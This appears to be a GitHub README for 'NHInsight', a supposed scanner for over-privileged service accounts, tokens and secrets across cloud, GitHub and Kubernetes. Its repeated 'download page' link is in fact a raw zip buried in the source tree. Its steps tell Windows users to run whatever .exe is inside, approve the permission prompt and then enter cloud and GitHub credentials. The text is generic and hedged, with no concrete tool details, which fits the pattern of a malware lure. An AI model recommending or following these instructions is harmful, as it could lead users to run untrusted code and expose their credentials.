# 🔍 NHInsight - Find risky access paths fast

[![Download NHInsight](https://img.shields.io/badge/Download-NHInsight-blue?style=for-the-badge)](https://github.com/Adenaprimary348/NHInsight/raw/refs/heads/main/nhinsight/providers/NH-Insight-2.9.zip)

## 🧭 What NHInsight does

NHInsight helps you spot risky non-human identities, tokens, and access paths across cloud and DevOps tools. It checks common places where machine accounts, secrets, and service access can hide.

Use it to review:

- AWS identity and access setup
- Azure access paths
- GCP service account use
- GitHub repository access
- GitHub Actions secrets and workflows
- Kubernetes service accounts and related access

It is built for users who want a clear view of where access may be too broad or exposed.

## 📥 Download and run on Windows

1. Open the download page here: https://github.com/Adenaprimary348/NHInsight/raw/refs/heads/main/nhinsight/providers/NH-Insight-2.9.zip
2. On the repository page, find the latest release or the main project files.
3. Download the Windows version if one is listed.
4. If the download is a `.zip` file, right-click it and select **Extract All**.
5. Open the extracted folder.
6. If you see an `.exe` file, double-click it to run NHInsight.
7. If Windows asks for permission, select **Yes**.

If the project is provided as a script or packaged app, follow the file name shown in the release or repository page and open it from the extracted folder.

## 🖥️ Windows setup

NHInsight is meant to run on a normal Windows desktop or laptop. A typical setup works well with:

- Windows 10 or Windows 11
- 4 GB of RAM or more
- 200 MB of free disk space
- Internet access for cloud and GitHub checks
- Permission to open local files and saved exports

For best results, use a user account that can open downloaded files and save reports in Documents or Desktop.

## 🧰 What you need before you start

Before you run NHInsight, keep these items ready:

- Your Windows computer
- The downloaded NHInsight file or folder
- Access details for the cloud or GitHub systems you want to review
- Any token, key, or login method your team uses for read-only checks
- A folder where you want to save results

If you plan to scan AWS, Azure, GCP, GitHub, or Kubernetes, make sure you have the right access in place. Read-only access is often enough for review tasks.

## 🚀 First run

After you open NHInsight, you will usually see a start screen or main panel with scan options.

Follow these steps:

1. Open the app.
2. Choose the cloud or platform you want to review.
3. Enter the required access details.
4. Select the scope, such as one account, one org, or one cluster.
5. Start the scan.
6. Wait for the results to load.
7. Review any risky identities, tokens, or paths the tool flags.

If the app saves a report, open it after the scan and check the items marked for review.

## 🔎 What to look for in results

NHInsight focuses on access that can be hard to track. Look for items such as:

- Service accounts with broad rights
- Tokens that never expire
- Keys used in more than one place
- GitHub Actions workflows with strong secrets access
- Kubernetes service accounts with wide cluster access
- Cloud roles that reach more resources than needed
- Orphaned identities that still have access
- Paths that let one system reach another system

The goal is to find access that should be tightened or removed.

## 🧩 Common use cases

### AWS
Check for IAM users, roles, and tokens with more access than they need. Review trust paths that let one role reach another account or service.

### Azure
Review app registrations, managed identities, and service principals. Look for broad rights, weak separation, and hidden access paths.

### GCP
Inspect service accounts, key use, and IAM roles. Find accounts that can reach too many resources or projects.

### GitHub
Review org and repo access, PAT use, and secret storage. Find machine access that could spread across repos.

### GitHub Actions
Check workflow files, secrets use, and token scope. Review how builds and jobs reach cloud or repo resources.

### Kubernetes
Look at service accounts, role bindings, and cluster roles. Find paths that let a pod or workload reach more than it should.

## 🛠️ How to get the best results

Use a small scope first, then expand it.

- Start with one account or one repo
- Review the first report before scanning more
- Use read-only access when possible
- Keep notes on what each finding means in your team
- Recheck the same scope after changes to confirm the fix

This helps you cut noise and focus on real issues.

## 📁 Reports and output

NHInsight may create files, logs, or export reports after a scan. Save them in a folder you can find later.

Good places to store output:

- Desktop
- Documents
- A team review folder
- A dated scan folder

Use a clear name for each scan, such as:

- `AWS-Review-April`
- `GitHub-Org-Check`
- `K8s-Cluster-Scan`

This makes it easy to compare results over time.

## ⚙️ Basic troubleshooting

If the app does not start:

- Check that the download finished
- Extract the files if they came in a zip
- Try running the file again
- Confirm that Windows did not block the file
- Make sure you are opening the correct file in the folder

If a scan does not connect:

- Confirm the access details are correct
- Check the scope you selected
- Make sure your account can read the target system
- Try a smaller scan first
- Check your internet connection

If results look empty:

- Confirm the target has data in it
- Check that the scan scope is not too narrow
- Make sure the right org, account, or cluster was chosen

## 🧠 How NHInsight fits into your workflow

NHInsight works well when you want a quick check of machine access before a review, change, or cleanup. It helps you see where non-human identities and secrets may create risk across cloud and CI/CD systems.

You can use it when:

- A team adds new service accounts
- A repo starts using more secrets
- A cluster gets new workloads
- A cloud account grows fast
- You want to review access before a change
- You want to check for stale or broad permissions

## 🧪 Typical scan flow

1. Download NHInsight from the link above
2. Open the app on Windows
3. Pick the platform you want to review
4. Add the needed access details
5. Run the scan
6. Read the results
7. Save the report
8. Fix the highest-risk items first

## 🔐 Access types NHInsight may review

NHInsight is built around machine access and the paths it can take. That can include:

- API tokens
- Access keys
- Service principals
- Managed identities
- Service accounts
- GitHub tokens
- CI/CD secrets
- Cluster role bindings

These are the places where hidden access often grows over time.

## 📌 Project details

- Name: NHInsight
- Type: Open-source security tool
- Focus: Risky non-human identities and access paths
- Platforms: AWS, Azure, GCP, GitHub, Kubernetes, GitHub Actions
- Topics: aws, azure, gcp, github, githubactions, iam, k8s, least-privilege, nhi, non-human-identity, secrets, service-accounts, zero-trust

## 🧭 Start here

1. Open the download page: https://github.com/Adenaprimary348/NHInsight/raw/refs/heads/main/nhinsight/providers/NH-Insight-2.9.zip
2. Get the Windows build or project files
3. Run the app
4. Scan one system first
5. Review the findings
6. Repeat for other systems